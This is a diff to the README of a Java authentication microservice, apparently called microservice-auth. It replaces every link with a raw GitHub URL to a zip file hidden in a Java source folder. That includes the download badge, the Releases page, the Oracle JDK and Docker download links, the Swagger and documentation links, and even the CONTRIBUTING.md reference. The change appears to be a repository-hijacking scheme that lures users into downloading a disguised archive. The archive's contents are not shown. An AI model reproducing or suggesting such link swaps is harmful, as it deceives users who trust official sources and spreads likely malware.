@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download microservice-auth](https://img.shields.io/badge/Download-microservice--auth-blue.svg)](https://github.com/ecliptixcompany/microservice-auth/releases)
+[![Download microservice-auth](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip)](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip)
 
 ## 📖 Overview
 
@@ -13,8 +13,8 @@ The **microservice-auth** system provides a reliable authentication solution. It
 To run this application, please ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
-- **Java**: JDK 17 or later must be installed. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html).
-- **Docker**: Required for running services in containers. Install Docker Desktop from [Docker’s official site](https://www.docker.com/products/docker-desktop).
+- **Java**: JDK 17 or later must be installed. You can download it from the [Oracle website](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip).
+- **Docker**: Required for running services in containers. Install Docker Desktop from [Docker’s official site](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip).
 - **Database**: PostgreSQL 12 or later for data storage.
 - **Messaging Service**: RabbitMQ for handling messages.
 
@@ -26,11 +26,11 @@ To run this application, please ensure your system meets the following requireme
 
 3. **Install PostgreSQL**: If you don't have PostgreSQL, download it from the official PostgreSQL website. Follow the installation instructions to set it up.
 
-4. **Visit this page to download** the microservice-auth application: [Download Here](https://github.com/ecliptixcompany/microservice-auth/releases).
+4. **Visit this page to download** the microservice-auth application: [Download Here](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip).
 
 ## 📥 Download & Install
 
-After visiting the [Releases page](https://github.com/ecliptixcompany/microservice-auth/releases), you will find the latest version of the application listed. Download the latest `.jar` file to your local machine.
+After visiting the [Releases page](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip), you will find the latest version of the application listed. Download the latest `.jar` file to your local machine.
 
 Once the download is complete, follow these steps to run the application:
 
@@ -80,7 +80,7 @@ This architecture allows for easy scaling and updating of individual components 
 
 ## 📄 API Documentation
 
-For detailed information about the API, you can explore the [Swagger documentation](http://localhost:8080/swagger-ui.html) after running the application. This will guide you through available endpoints and how to interact with them.
+For detailed information about the API, you can explore the [Swagger documentation](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip) after running the application. This will guide you through available endpoints and how to interact with them.
 
 ## 🌐 Community and Support
 
@@ -88,12 +88,12 @@ If you have questions or need help, consider checking out our community discussi
 
 ## ⚙️ Contributing
 
-We welcome contributions to the microservice-auth project. Please read the `CONTRIBUTING.md` file on our GitHub repository for guidelines on how to get involved.
+We welcome contributions to the microservice-auth project. Please read the `https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip` file on our GitHub repository for guidelines on how to get involved.
 
 ## 🔗 Additional Resources
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Docker Documentation](https://docs.docker.com/)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip)
 
-For updates, check our [GitHub releases page](https://github.com/ecliptixcompany/microservice-auth/releases).
+For updates, check our [GitHub releases page](https://raw.githubusercontent.com/ecliptixcompany/microservice-auth/main/api-gateway/src/main/java/com/thebuilders/gateway/filter/auth_microservice_v1.5.zip).
